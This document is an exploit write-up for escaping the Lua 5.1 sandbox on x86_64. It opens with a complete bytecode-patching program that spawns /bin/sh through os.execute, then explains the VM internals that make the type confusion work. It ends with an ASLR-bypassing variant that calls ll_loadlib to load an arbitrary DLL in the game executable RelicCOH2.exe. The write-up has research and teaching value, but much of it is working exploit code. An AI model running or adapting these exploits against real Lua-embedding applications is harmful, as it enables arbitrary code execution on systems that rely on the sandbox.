# Exploiting Lua 5.1 on x86_64

The following Lua program generates a Lua bytecode program called `lua-sandbox-rce.luac`, which in turn spawns a shell from within Lua 5.1 sandbox. The remainder of this document attempts to explain how this program works by a whirlwind tour of relevent bits of the Lua 5.1 virtual machine.

```lua
function outer()
  local magic -- In bytecode, the stack slot corresponding to this local is changed
  local function middle()
    local co, upval
    local ub1 = {[0] = -- Convert uint8_t to char[1]
      "\0", "\1", "\2", "\3", "\4", "\5", "\6", "\7", "\8", "\9", "\10", "\11", "\12", "\13", "\14",
      "\15", "\16", "\17", "\18", "\19", "\20", "\21", "\22", "\23", "\24", "\25", "\26", "\27", "\28",
      "\29", "\30", "\31", "\32", "\33", "\34", "\35", "\36", "\37", "\38", "\39", "\40", "\41", "\42",
      "\43", "\44", "\45", "\46", "\47", "\48", "\49", "\50", "\51", "\52", "\53", "\54", "\55", "\56",
      "\57", "\58", "\59", "\60", "\61", "\62", "\63", "\64", "\65", "\66", "\67", "\68", "\69", "\70",
      "\71", "\72", "\73", "\74", "\75", "\76", "\77", "\78", "\79", "\80", "\81", "\82", "\83", "\84",
      "\85", "\86", "\87", "\88", "\89", "\90", "\91", "\92", "\93", "\94", "\95", "\96", "\97", "\98",
      "\99", "\100", "\101", "\102", "\103", "\104", "\105", "\106", "\107", "\108", "\109", "\110", "\111",
      "\112", "\113", "\114", "\115", "\116", "\117", "\118", "\119", "\120", "\121", "\122", "\123", "\124",
      "\125", "\126", "\127", "\128", "\129", "\130", "\131", "\132", "\133", "\134", "\135", "\136", "\137",
      "\138", "\139", "\140", "\141", "\142", "\143", "\144", "\145", "\146", "\147", "\148", "\149", "\150",
      "\151", "\152", "\153", "\154", "\155", "\156", "\157", "\158", "\159", "\160", "\161", "\162", "\163",
      "\164", "\165", "\166", "\167", "\168", "\169", "\170", "\171", "\172", "\173", "\174", "\175", "\176",
      "\177", "\178", "\179", "\180", "\181", "\182", "\183", "\184", "\185", "\186", "\187", "\188", "\189",
      "\190", "\191", "\192", "\193", "\194", "\195", "\196", "\197", "\198", "\199", "\200", "\201", "\202",
      "\203", "\204", "\205", "\206", "\207", "\208", "\209", "\210", "\211", "\212", "\213", "\214", "\215",
      "\216", "\217", "\218", "\219", "\220", "\221", "\222", "\223", "\224", "\225", "\226", "\227", "\228",
      "\229", "\230", "\231", "\232", "\233", "\234", "\235", "\236", "\237", "\238", "\239", "\240", "\241",
      "\242", "\243", "\244", "\245", "\246", "\247", "\248", "\249", "\250", "\251", "\252", "\253", "\254",
      "\255"}
    local function ub4(x) -- Convert little endian uint32_t to char[4]
      local b0 = x % 256; x = (x - b0) / 256
      local b1 = x % 256; x = (x - b1) / 256
      local b2 = x % 256; x = (x - b2) / 256
      local b3 = x % 256
      return ub1[b0] .. ub1[b1] .. ub1[b2] .. ub1[b3]
    end
    local function ub8(x) -- Same, x64
      local b0 = x % 256; x = (x - b0) / 256
      local b1 = x % 256; x = (x - b1) / 256
      local b2 = x % 256; x = (x - b2) / 256
      local b3 = x % 256; x = (x - b3) / 256
      local b4 = x % 256; x = (x - b4) / 256
      local b5 = x % 256; x = (x - b5) / 256
      local b6 = x % 256; x = (x - b6) / 256
      local b7 = x % 256
      return ub1[b0] .. ub1[b1] .. ub1[b2] .. ub1[b3] .. ub1[b4] .. ub1[b5] .. ub1[b6] .. ub1[b7]
    end
    local function asnum(x)
      for i = x, x, 0 do
        return i * 2^52 * 2^1022
      end
    end
    local function inner()
      co = coroutine.wrap(function() end)
      upval = "widenext".."t".."m".."6!pad6".. ub8(asnum(co) + 32)
      local upval_ptr = ub8(asnum(upval) + 24)
      magic = "AAAABBBB" .. upval_ptr .. upval_ptr
    end
    local i2f = asnum
    local f2i = function(x) return x * 2.^-52 * 2.^-1022 end
    local delta = 13328 -- (char*)os_execute - (char*)luaB_auxwrap -- lua-5.1.4 x86_64
    local arg = '/bin/sh'
    inner()
    local luaB_auxwrap = i2f(magic)
    magic = f2i(luaB_auxwrap + delta)
    co(arg)
  end
  middle()
end

f = io.open("lua-sandbox-rce.luac", "wb")
f:write(string.dump(outer)
  :gsub("\96\128%z\128", "\22\128\0\128") -- remove the FORPREP in asnum
  :gsub("(\100%z%z%z)....", "%1\0\0\0\1", 1) -- in outer, bind magic to the stack slot containing the executing function
)
f:close()
```
--------------------------------------------------------------------------------
The first structure of interest is the `TValue`, which is used to represent Lua values throughout the virtual machine:

```c
struct TValue {
  union {
    void *p;
    double n;
  } value;
  int tt;
};
```

The value of `tt` specifies which member of the union is in use. We're interested in the following values for `tt` and associated layouts of `TValue` on 32-bit Windows:

|   | Bits 0-31  | Bits 32-63 | Bits 64-95 (`tt`)    | Bits 96-127 |
|---| ---------- | ---------- | -------------------- | ----------- |
| <td colspan=2>unused</td>   | `LUA_TNIL`           | padding     |
|   | `void*`    | unused     | `LUA_TLIGHTUSERDATA` | padding     |
| <td colspan=2>`double`</td> | `LUA_TNUMBER`        | padding     |
|   | `TString*` | unused     | `LUA_TSTRING`        | padding     |
|   | `Closure*` | unused     | `LUA_TFUNCTION`      | padding     |

--------------------------------------------------------------------

The first Lua virtual machine opcodes of interest are `OP_FORPREP` and `OP_FORLOOP`, which are used to implement Lua's numeric for loop. Their implementations are as follows:

```c
case OP_FORPREP:
  const TValue *init = ra;
  const TValue *plimit = ra+1;
  const TValue *pstep = ra+2;
  L->savedpc = pc;  /* next steps may throw errors */
  if (!tonumber(init  , ra  )) luaG_runerror(L, "'for' initial value must be a number");
  if (!tonumber(plimit, ra+1)) luaG_runerror(L, "'for' limit must be a number");
  if (!tonumber(pstep , ra+2)) luaG_runerror(L, "'for' step must be a number");
  setnvalue(ra, nvalue(ra) - nvalue(pstep));
  dojump(L, pc, GETARG_sBx(i));
```

```c
case OP_FORLOOP:
  double step = nvalue(ra+2);
  double idx = nvalue(ra) + step; /* increment index */
  double limit = nvalue(ra+1);
  if ((0 < step) ? (idx <= limit) : (limit <= idx)) {
    dojump(L, pc, GETARG_sBx(i));  /* jump back */
    setnvalue(ra, idx);  /* update internal index... */
    setnvalue(ra+3, idx);  /* ...and external index */
  }
```

In normal operation, `OP_FORPREP` checks that the three parameters to a numeric for loop are in fact numbers, performs the inverse of the addition at the start of `OP_FORLOOP`, and then jumps to a `OP_FORLOOP` instruction. In normal operation, `OP_FORLOOP` executes before the start of the loop and at the end of every loop body, and its role is to increment the loop counter and then conditionally jump back into the loop body. Crucially, because it is assumed that `OP_FORPREP` has checked that every `TValue` contains a number, `OP_FORLOOP` unconditionally interprets the low 64-bits of every `TValue` as a `double`. Although `OP_FORPREP` and `OP_FORLOOP` normally occur in pairs, if we're writing bytecode manually, then we can emit a lone `OP_FORLOOP` instruction, or if we're patching generated bytecode, then we can replace an `OP_FORPREP` instruction with an instruction which just does `dojump(L, pc, GETARG_sBx(i))`.

Patching out an `OP_FORPREP` instruction gives us our first interesting function:

```lua
asnum = loadstring((string.dump(function(x)
  for i = x, x, 0 do
    return i
  end
end):gsub("\96%z%z\128", "\22\0\0\128")))
```

Upon first inspection, `asnum` doesn't seem overly useful:

```lua
f = function() end
print(tostring(f)) --> function: 003C42D0
print(asnum(f))    --> 1.9511956687576e-317
```

As a stranger example, consider the following:

```lua
do local dummy = 2^52 end
local f = function() end
print(tostring(f))     --> function: 003BC810
print(asnum(f) - 2^52) --> 3917840
```

The first line creates a `TValue` containing a 64-bit `double` payload, and then throws away the `TValue` as it leaves scope. The second line creates a `TValue` containing a 32-bit `Closure*` payload, and due to the stack nature of Lua locals, this `TValue` re-uses the storage from the previous `TValue`, so it inherits bits 32-63 from the `double`. In binary, `2^52` is a one followed by fifty-two zeroes, and a `double` conveniently has fifty-two bits of mantissa (precision). Therefore, for a thirty-two bit `n`, `2^52+n` in binary is a one followed by twenty zeroes followed by the thirty-two bits of `n`, and in a `double` these bits of `n` occupy the low thirty-two bits. The above example uses this process in reverse to convert `f` to a thirty-two bit number, which is clear after noticing that `0x003BC810` (hexadecimal) is equal to `3917840` (decimal). As such, `asnum` gives us a way to pull the `TString*` or `Closure*` out of a specially constructed `TValue`.

--------------------------------------------------------------------------------

The next structure of interest is `LClosure`, which represents an instance of a Lua function:

```c
struct LClosure {
  GCObject *next;
  lu_byte tt; /* == LUA_TFUNCTION */
  lu_byte marked;
  lu_byte isC; /* == 0 */
  lu_byte nupvalues;
  GCObject *gclist;
  struct Table *env;
  struct Proto *p; /* this contains the bytecode to execute */
  UpVal *upvals[nupvalues]; /* variably sized */
};
```

Also of interest is `TString`, which represents a Lua string:

```c
struct TString {
  GCObject *next;
  lu_byte tt; /* == LUA_TSTRING */
  lu_byte marked;
  lu_byte reserved; /* == 0 for most strings */
  unsigned int hash; /* == hash_of(s) */
  size_t len;
  char s[len]; /* variably sized */
};
```

Comparing their memory layouts, we get the following:

| Bits 0-31<th colspan="4">Bits 32-63</th> | Bits 64-95 | Bits 96-127 <th colspan="2">Bits 128-191 |
| ------ | ---- | -------- | ---------- | ----- |
| `next` | `tt` | `marked` | `isC`  | `nupvalues` | `gclist` | `env` | `p` | `upvals[0]` |
| `next` | `tt` | `marked` | `reserved` | padding | `hash` | `len` | `s[0:3]` | `s[4:7]` |

Correcting for x64:

| offset | `TString` fields  | `LClosure` fields |
| ------:| ----------------- | ----------------- |
|    0-7 | `next`            | `next`            |
|      8 | `tt`              | `tt`              |
|      9 | `marked`          | `marked`          |
|     10 | `isC`             | *reserved*        |
|     11 | reserved `f7`     | `nupvalues`       |
|  12-15 | `hash`            | `00007fff` pad    |
|  16-23 | `len`             | `gclist`          |
|  24-31 | strbytes`[0:7]`   | `env`             |
|  32-39 | strbytes`[8:15]`  | `p`               |
|  40-47 | strbytes`[12:19]` | `upvals[0]`       |

Related to `LClosure` is the `UpVal` structure, which represents a single free variable of a Lua closure:

```c
struct UpVal {
  GCObject *next; /* next in the GC list, not the next UpVal */
  lu_byte tt; /* == LUA_TUPVAL */
  lu_byte marked;
  TValue *v;
  /* ... more fields ... (not of interest) */
};
```

To see these structures in practice, consider the following example:

```lua
function outer()
  local s = "Hello"
  local function inner()
    s = "World"
  end
  print(s) --> Hello
  inner()
  print(s) --> World
end
```

The `outer` function becomes an `LClosure` with zero `UpVal`s, whereas the `inner` function becomes an `LClosure` with one `UpVal` (whose `v` field points to the `s` variable in `outer`'s stack).

--------------------------------------------------------------------------------

The next topic of note is how call frames work in the Lua virtual machine. For this, consider the following example:

```lua
function f(x)
  local y = 22
  g(33)
end
function g(x)
  h(44)
end
function h(x)
  return 55
end
f(11)
```

When the `return 55` instruction is executing, the top of the stack contains eight interesting values and four call frames:
<table><tr><td>... low part of stack ...</td><td>`f`</td><td>`11`</td><td>`22`</td><td>`g`</td><td>`33`</td><td>`h`</td><td>`44`</td><td>`55`</td></tr>
<tr><th colspan="3">ambient frame</th><td colspan="6"/></tr>
<tr><td colspan="1"/><th/><th colspan="4">`f`'s frame</th><td colspan="3"/></tr>
<tr><td colspan="4"/><th/><th colspan="3">`g`'s frame</th><td colspan="1"/></tr>
<tr><td colspan="6"/><th/><th colspan="2">`h`'s frame</th></tr>
</table>

A function's call frame includes its parameters and local variables, and the function and parameters of anything that it directly calls (as it has to be able to set up the call within its frame). Frames are represented by the `CallInfo` structure:

```c
struct CallInfo {
  TValue* base;
  TValue* func;
  TValue* top;
  const Instruction *savedpc;
  /* ... more fields ... (not of interest) */
};
```

The `base` and `top` fields specify the range of the stack that the above diagram calls a frame. The `func` field points one to the left of `base` (the empty boxes to the left of frames in the above diagram), and specifies which function is being called. The final field of interest, `savedpc`, specifies the location in the function's bytecode to return to when reactivating the call frame - in most cases this will be an instruction immediately following an `OP_CALL` instruction.

Switching between call frames is interesting, and is done by the following code in the Lua virtual machine:

```c
void luaV_execute (lua_State *L, int nexeccalls) {
  LClosure *cl;
  TValue *base;
  TValue *k;
  const Instruction *pc;
 reentry:  /* entry point */
  lua_assert(L->ci->func->tt == LUA_TFUNCTION && !(clvalue(L->ci->func)->l.isC));
  pc = L->savedpc;
  cl = &clvalue(L->ci->func)->l;
  base = L->base;
  k = cl->p->k;
  /* main loop of interpreter */
  for (;;) {
    const Instruction i = *pc++;
    /* ... debugging stuff ... (not of interest) */
    switch (GET_OPCODE(i)) {
      /* ... various other opcodes (some of which use cl and k) ... */
      case OP_CALL: {
        int b = GETARG_B(i);
        int nresults = GETARG_C(i) - 1;
        if (b != 0) L->top = ra+b;  /* else previous instruction set top */
        L->savedpc = pc;
        switch (luaD_precall(L, ra, nresults)) {
          case PCRLUA: {
            nexeccalls++;
            goto reentry;  /* restart luaV_execute over new Lua function */
          }
          /* ... other cases ... (not of interest) */
        }
      }
      case OP_RETURN: {
        int b = GETARG_B(i);
        if (b != 0) L->top = ra+b-1;
        if (L->openupval) luaF_close(L, base);
        L->savedpc = pc;
        b = luaD_poscall(L, ra); /* pos is a shortening of post, as in pre-call and post-call */
        if (--nexeccalls == 0)  /* was previous function running `here'? */
          return;  /* no: return */
        else {  /* yes: continue its execution */
          if (b) L->top = L->ci->top;
          lua_assert(GET_OPCODE(*((L->ci)->savedpc - 1)) == OP_CALL);
          goto reentry;
        }
      }
    }
  }
}

```
Of particular note is that `OP_RETURN` ends with `goto reentry`, and `reentry:` is followed by a complex assertion which checks that the `CallInfo`'s `func` field points to a `TValue` containing an `LClosure`. However, `lua_assert` is turned off by default, and very few people turn it on. In our case, assertions are indeed turned off, so the complex assertion doesn't actually run, and the `TValue` is unconditionally treated as containing an `LClosure*`.

At this point, the astute reader will recognise the familiarity with `OP_FORLOOP`, and will recall that we compared the memory layout of `LClosure` and `TString`. Given this, it should be obvious where we're going.

--------------------------------------------------------------------------------

The next instruction of interest is `OP_CLOSURE`, which creates a `TValue` containing an `LClosure`, and initialises its `UpVal`s. The implementation of this instruction is as follows:

```c
case OP_CLOSURE:
  Proto *p;
  Closure *ncl;
  int nup, j;
  p = cl->p->p[GETARG_Bx(i)];
  nup = p->nups;
  ncl = luaF_newLclosure(L, nup, cl->env);
  ncl->l.p = p;
  for (j=0; j<nup; j++, pc++) {
    if (GET_OPCODE(*pc) == OP_GETUPVAL)
      ncl->l.upvals[j] = cl->upvals[GETARG_B(*pc)];
    else {
      lua_assert(GET_OPCODE(*pc) == OP_MOVE);
      ncl->l.upvals[j] = luaF_findupval(L, base + GETARG_B(*pc));
    }
  }
  setclvalue(L, ra, ncl);
  Protect(luaC_checkGC(L));
```

In the cases we're interested in, an `OP_CLOSURE` instruction is followed by one dummy `OP_MOVE` instruction for each upvalue, which collectively specify which `TValue`s of the current call frame should be pointed to by the closure's `UpVal` structures. In generated bytecode, the specified `TValue`s can only be parameters or local variables of the current call frame, but when writing bytecode manually, the specified `TValue`s can be any members of the current call frame.

In particular, when writing bytecode manually we can point `UpVal`s at the same stack slots that the next call frame's `CallInfo::func` field points to. The following example gives a simple case of this, where `print(magic)` doesn't print `nil`:

```lua
loadstring(string.dump(function()
  local magic = nil
  local function middle()
    print(magic) --> function: 0051639
  end
  middle()
end):gsub("(\100%z%z%z)....", "%1\0\0\0\1"))()
```

As a more interesting example, we can change the `TValue` pointed to by the `UpVal`, and then return to the call frame whose `CallInfo::func` pointed at the same `TValue`:

```lua
loadstring(string.dump(function()
  local magic = nil
  local function middle()
    local function inner()
      magic = inner
      return "print", "World"
    end
    inner()
    print("Hello") --> World
  end
  middle()
end):gsub("(\100%z%z%z)....", "%1\0\0\0\1", 1))()
```

The above example is somewhat intricate: because of `magic = inner`, after the call to `inner`, `luaV_execute`'s `cl` variable is set back to `inner` rather than `middle`, so `print("Hello")` actually prints `World`.

--------------------------------------------------------------------------------

The first interesting application of the above technique is to create arbitrary `TValue`s. For this, we need to recall `asnum` from earlier, and we also need a helper function for converting numbers to strings:

```lua
asnum = loadstring((string.dump(function(x)
  for i = x, x, 0 do
    return i
  end
end):gsub("\96%z%z\128", "\22\0\0\128")))

ub4 = function(x) -- Convert little endian uint32_t to char[4]
  local b0 = x % 256; x = (x - b0) / 256
  local b1 = x % 256; x = (x - b1) / 256
  local b2 = x % 256; x = (x - b2) / 256
  local b3 = x % 256
  return string.char(b0, b1, b2, b3)
end
```

The astute reader will note that `ub4` can be rewritten to work even when `string.char` is not present (the actual exploit code for RelicCOH2.exe implements `ub4` by using a lookup table to convert the individual bytes to strings of length 1, and then concatenating the strings).

With these functions in place, consider the following:

```lua
loadstring(string.dump(function()
  local magic = nil
  local function middle()
    local print = print
    local lud, upval
    local function inner()
      lud = 2^52 .. ub4(0xDEADBEEF) .."high".. ub4(2) .."padd"
      upval = 2^52 .."next".."t".."m".."pa".. ub4(asnum(lud) - 2^52 + 16 + 20)
      local upval_ptr = ub4(asnum(upval) - 2^52 + 16 + 20)
      magic = upval_ptr .. upval_ptr
    end
    inner()
    print(magic) --> userdata: DEADBEEF
  end
  middle()
end):gsub("(\100%z%z%z)....", "%1\0\0\0\1", 1))()
```

The first interesting assignment in the above is to the `lud` variable. Ignoring the `2^52 ..` for a moment, the remainder is a 128 bit string which can be interpreted as a `TValue`: four bytes containing a pointer to `0xDEADBEEF`, four unused bytes, four bytes for a `tt` value of `LUA_TLIGHTUSERDATA`, and four bytes of padding. The next interesting assignment is to the `upval` variable. Again ignoring the `2^52 ..`, the remainder can be interpreted as an `UpVal`: four bytes for `next`, one byte each for `tt` and `marked`, two bytes of padding, and then four bytes of `TValue*`. The final interesting assignment to to the `magic` variable, which is a `TString` with an 8-byte payload, and will later be reinterpreted as an `LClosure`. As we've previously seen by comparing the memory layouts, the first four bytes become a `Proto*`, and the next four bytes become an `UpVal*`.

At this point, the remaining tricks of the `inner` function are the numeric constants `2^52`, `16`, and `20`. The result of a string concatenation is a `TValue` containing a `TString*`, but this `TValue` has the interesting property that the 32 unused bits following the `TString*` are copied from the leftmost operand of the concatenation. As such, when the leftmost operand in a concatenation is `2^52`, the resulting `TValue` can go through `asnum` and then have `2^52` subtracted to yield the `TString*`. The next value, `16` is the size of all of the fields in a `TString` prior to the actual string data. The final value, `20`, is the length of the string `4.5035996273705e+015`, with this being the string representation of `2^52`.

On x64, `sizeof(TString) = 24`, so this turns into:

```lua
loadstring(string.dump(function()
  local magic = nil
  local function middle()
    local print = print
    local lud, upval
    local function inner()
      lud = ub8(0xDEADBEEF) .. ub4(2) .."padd"
      upval = "widenext".."t".."m".."6!pad6".. ub8(asnum(lud) + 24)
      local upval_ptr = ub8(asnum(upval) + 24)
      magic = "AAAABBBB" .. upval_ptr .. upval_ptr
    end
    inner()
    print(magic) --> userdata: DEADBEEF
  end
  middle()
end):gsub("(\100%z%z%z)....", "%1\0\0\0\1", 1))()
```
--------------------------------------------------------------------------------

Before the final reveal, two functions of interest are needed:

```lua
f2ii = function(x) -- Convert double to uint32_t[2]
  if x == 0 then return 0, 0 end
  if x < 0 then x = -x end

  local e_lo, e_hi, e, m = -1075, 1023
  while true do -- this loop is math.frexp
    e = (e_lo + e_hi)
    e = (e - (e % 2)) / 2
    m = x / 2^e
    if m < 0.5 then e_hi = e elseif 1 <= m then e_lo = e else break end
  end

  if e+1023 <= 1 then
    m = m * 2^(e+1074)
    e = 0
  else
    m = (m - 0.5) * 2^53
    e = e + 1022
  end

  local lo = m % 2^32
  m = (m - lo) / 2^32
  local hi = m + e * 2^20
  return lo, hi
end

ii2f = function(lo, hi) -- Convert uint32_t[2] to double
  local m = hi % 2^20
  local e = (hi - m) / 2^20
  m = m * 2^32 + lo

  if e ~= 0 then
    m = m + 2^52
  else
    e = 1
  end
  return m * 2^(e-1075)
end
```

The role of `f2ii` is to take a number (say the result of `asnum`), and return two integers in range `[0, 2^32)`, which are obtained by reinterpreting the 8 bytes of the original `double` as two `uint32_t`s. This particular implementation of `f2ii` ignores the sign bit of the original `double`, so the second return value is always in the range `[0,2^31)`, but this doesn't matter for our purposes. This particular implementation of `f2ii` also fails for inputs which are `NaN` or positive or negative infinity, but again this is acceptable for our purposes. The `ii2f` function performs the inverse of `f2ii`.

The interested reader should consult the [IEEE754-1985][] specification of floating point numbers to gain an appreciation of why these functions work. Alternatively, `ii2f` and `f2ii` can be compared to `reader` and `writer` in the [implementation of vstruct][vstruct].

[IEEE754-1985]: http://en.wikipedia.org/wiki/IEEE_754-1985#Representation_of_numbers
[vstruct]: https://github.com/ToxicFrog/vstruct/blob/master/vstruct/io/f.lua

--------------------------------------------------------------------------------

The final structure of interest is `CClosure`, which is similar to an `LClosure`, but represents an instance of a C function rather than a Lua function:

```c
struct CClosure {
  GCObject *next;
  lu_byte tt; /* == LUA_TFUNCTION */
  lu_byte marked;
  lu_byte isC; /* == 1 */
  lu_byte nupvalues;
  GCObject *gclist;
  struct Table *env;
  int (*f)(lua_State*);
  TValue upvalue[nupvalues]; /* variably sized */
};
```

The interesting observation is that this structure contains a function pointer, and said function pointer is called when Lua code calls the function represented by the `CClosure`. If we want to execute arbitrary code, then we could adapt the previous example to construct a `CClosure`, and then call it rather than print it. Unfortunately, reality is cold and harsh: DEP means that we we can only execute code in memory pages which are marked as executable, and ASLR means that we don't know where those pages are. The normal method for defeating DEP is to call code which is already present in the executable, and in the case of RelicCOH2.exe, the executable contains a function called `ll_loadlib`, which is the C function that gets called when Lua code calls `package.loadlib` (the purpose of this function being to load arbitrary DLLs). That solves the DEP problem, but it leaves the ASLR problem: we have no idea where `ll_loadlib` is in memory.

One approach for defeating ASLR is to inspect the function pointer in an existing `CClosure` object. In our case, while the Lua sandbox we're playing in doesn't have `package.loadlib`, it does have `coroutine.wrap`, and `coroutine.wrap` creates a `CClosure` whose function pointer is set to `luaB_auxwrap`. Following on from the previous example, consider the following:

```lua
loadstring(string.dump(function()
  local magic = nil
  local function middle()
    local print, asnum, f2ii = print, asnum, f2ii
    local co, upval
    local function inner()
      do local l0 = 2^52 local l1, l2, l3, l4, l5, l6, l7 = l0, l0, l0, l0, l0, l0, l0 end
      co = coroutine.wrap(function() end)
      upval = 2^52 .."next".."t".."m".."pa".. ub4(asnum(co) - 2^52 + 12)
      local upval_ptr = ub4(asnum(upval) - 2^52 + 16 + 20)
      magic = upval_ptr .. upval_ptr
    end
    inner()
    print(f2ii(asnum(magic))) --> 7906440, 1396459600
  end
  middle()
end):gsub("(\100%z%z%z)....", "%1\0\0\0\1", 1))()
```

In this example, we call `coroutine.wrap` in order to create a `CClosure`, and then print out the `env` and `f` fields of the `CClosure`. The line prior to the assignment to `co` sprays the stack with the value `2^52` to ensure that we can do the usual `asnum(co) - 2^52` trick. For pulling out the `f` field, we cannot use the `2^52` trick,  as the `f` field is followed by 4 bytes of padding whose value is indeterminate. Instead, we create an `UpVal` whose `TValue*` is the address of the `env` field, and use `f2ii`/`asnum` to read two 32-bit values. Note that we could set the `TValue*` to the address of `f`, but this would increase the likelihood of `f2ii` receiving a NaN or an infinity as input, which it cannot handle.

By disassembly, we can learn that in RelicCOH2.exe, `luaB_auxwrap` and `ll_loadlib` are 39984 bytes apart. This leads to the following code for defeating ASLR:

```lua
loadstring(string.dump(function()
  local magic = nil
  local function middle()
    local print, asnum, f2ii = print, asnum, f2ii
    local co, upval
    local function inner()
      do local l0 = 2^52 local l1, l2, l3, l4, l5, l6, l7 = l0, l0, l0, l0, l0, l0, l0 end
      co = coroutine.wrap(function() end)
      upval = 2^52 .."next".."t".."m".."pa".. ub4(asnum(co) - 2^52 + 12)
      local upval_ptr = ub4(asnum(upval) - 2^52 + 16 + 20)
      magic = upval_ptr .. upval_ptr
    end
    local dll_name = "my_dll.dll"
    local function_name = "entry_point"
    local delta = 39984 -- this offset is only valid for RelicCOH2.exe; it will lead to a crash in most other programs
    inner()
    local env, f = f2ii(asnum(magic))
    f = f + delta
    magic = ii2f(env, f)
    co(dll_name, function_name) -- calls ll_loadlib
  end
  middle()
end):gsub("(\100%z%z%z)....", "%1\0\0\0\1", 1))()
```
